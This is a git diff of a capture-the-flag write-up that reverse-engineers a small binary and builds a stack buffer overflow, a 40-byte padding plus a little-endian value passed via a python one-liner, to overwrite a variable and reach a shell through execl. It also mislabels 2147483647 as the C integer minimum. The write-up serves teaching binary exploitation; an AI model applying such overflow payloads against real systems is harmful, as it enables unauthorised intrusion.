@@ -14,7 +14,6 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   return 0;
 }
 
-
 We can see that if argv[1] == 1464814662 (0x574f4c46 in hex) we will have a shell and we can gte the flag.
 But we have a problem, if argv[1] is greater thant 9, the function return 1 and the program stop.
 So we have to find a way to have 1464814662 in argv[1] and argv[1] > 9.
@@ -35,7 +34,7 @@ Dump of assembler code for function main:
    0x08048433 <+15>:	mov    (%eax),%eax
    0x08048435 <+17>:	mov    %eax,(%esp)
    0x08048438 <+20>:	call   0x8048360 <atoi@plt>
-   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
+   0x0804843d <+25>:	mov    %eax,0x3c(%esp)        --> v5
    0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
    0x08048446 <+34>:	jle    0x804844f <main+43>
    0x08048448 <+36>:	mov    $0x1,%eax
@@ -46,7 +45,7 @@ Dump of assembler code for function main:
    0x0804845d <+57>:	add    $0x8,%eax
    0x08048460 <+60>:	mov    (%eax),%eax
    0x08048462 <+62>:	mov    %eax,%edx
-   0x08048464 <+64>:	lea    0x14(%esp),%eax
+   0x08048464 <+64>:	lea    0x14(%esp),%eax      --> dest
    0x08048468 <+68>:	mov    %ecx,0x8(%esp)
    0x0804846c <+72>:	mov    %edx,0x4(%esp)
    0x08048470 <+76>:	mov    %eax,(%esp)
@@ -56,7 +55,6 @@ Dump of assembler code for function main:
    0x08048482 <+94>:	movl   $0x0,0x8(%esp)
    0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
    0x08048492 <+110>:	movl   $0x8048583,(%esp)
----Type <return> to continue, or q <return> to quit---
    0x08048499 <+117>:	call   0x8048350 <execl@plt>
    0x0804849e <+122>:	mov    $0x0,%eax
    0x080484a3 <+127>:	leave  
@@ -64,7 +62,22 @@ Dump of assembler code for function main:
 
 We know that the buffer of dest is 40 bytes long, so we can put 40 bytes + 0x574f4c46 in argv[2] to change the value of v5 to 0x574f4c46.
 We need to convert 0x574f4c46 in little endian = \x46\x4c\x4f\x57
-So the second argument will be : 
+
+chat dest[40] is declared before v5 in the memory :
+>>> 0x14
+20
+
+v5 :
+>>> 0x3c
+60
+
+padding :
+>>> 0x3c - 0x14
+40
+
+So we have a padding of 40 bytes to put in argv[2] and we need to put \x46\x4c\x4f\x57 after the padding.
+
+So the second argument will be :
 python -c "print 'A'*40 + '\x46\x4c\x4f\x57'"
 
 int min in c : 2147483647
